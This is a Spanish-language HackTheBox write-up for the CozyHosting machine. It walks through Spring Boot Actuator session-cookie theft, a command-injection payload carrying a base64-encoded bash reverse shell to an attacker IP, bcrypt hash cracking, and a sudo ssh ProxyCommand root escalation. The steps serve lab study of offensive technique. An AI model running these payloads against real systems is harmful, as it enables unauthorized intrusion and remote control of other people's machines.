---
title: "CozyHosting - HackTheBox"
slug: "htb-cozyhosting"
date: "2026-04-15"
platform: "HackTheBox"
category: "Linux / Web"
tags: ["spring-boot", "command-injection", "postgresql", "hashcat", "sudo-ssh"]
difficulty: "Medio"
featured: true
summary: "Explotación de Spring Boot Actuator, filtrado de cookies de sesión, inyección de comandos en parámetros no sanitizados y crackeo de hash PostgreSQL."
flag_user: "HTB{c0zy_h0st_s3ss10n_st0l3n}"
flag_root: "HTB{r00t_c0zy_sh3ll_3xpl01t}"
---

# CozyHosting (HackTheBox)

Máquina Linux de dificultad Media centrada en el ecosistema Spring Boot de Java, descubrimiento de endpoints de diagnóstico y ejecución remota de comandos.

---

## 1. Fase de Reconocimiento

```bash
nmap -p- --open -sS --min-rate 3000 -n -Pn 10.10.11.230 -oN allPorts.txt
```

Puertos descubiertos:
- `22/tcp`: OpenSSH 8.9p1
- `80/tcp`: Servidor web con redirección a `http://cozyhosting.htb`

Añadimos la resolución en `/etc/hosts`:
```bash
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

---

## 2. Descubrimiento de Spring Boot Actuator

Fuzzing de rutas con `gobuster`:
```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Localizamos el endpoint expuesto `/actuator/sessions` donde se listan las sesiones activas de los usuarios autenticados:
```json
{
  "A5B4C3D2E1...": "kanderson"
}
```

Usando la cookie de sesión obtenida, accedemos al panel `/admin`.

---

## 3. Explotación: Command Injection & Reverse Shell

En el formulario de configuración automática SSH dentro del panel de administración encontramos un campo vulnerable a inyección de comandos en el parámetro `username`. Con bypass de espacios usando `${IFS}`:

```bash
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDQ0IDA+JjE="${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
```

¡Obtenemos acceso como usuario `app`!

---

## 4. Escalada de Privilegios a Root

En el archivo `application.properties` encontramos credenciales de base de datos PostgreSQL:
- Usuario: `postgres`
- Contraseña encontrada y hash del usuario `admin` extraído.

Crackeamos el hash bcrypt con hashcat:
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Con las credenciales obtenidas iniciamos sesión por SSH como `josh`. Ejecutamos `sudo -l`:
```
User josh may run the following commands on cozyhosting:
    (root) /usr/bin/ssh *
```

Aprovechando la opción ProxyCommand de SSH según GTFOBins:
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Conseguimos shell interactiva como `root`.
